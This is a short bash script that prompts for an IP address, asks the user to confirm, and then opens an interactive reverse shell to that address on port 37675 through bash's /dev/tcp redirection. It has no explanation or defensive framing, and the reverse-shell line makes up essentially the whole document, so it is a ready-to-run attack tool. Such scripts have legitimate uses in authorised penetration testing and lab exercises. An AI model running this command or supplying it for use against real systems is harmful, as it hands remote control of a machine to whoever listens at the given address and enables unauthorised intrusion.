#!/bin/bash

read -p "Input IP to create a reverse shell to : " rvrsIP

#to confirm::
read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || ${confirm^^} == 'YES' ]] || exit 1


bash -i >& /dev/tcp/$rvrsIP/37675 0>&1

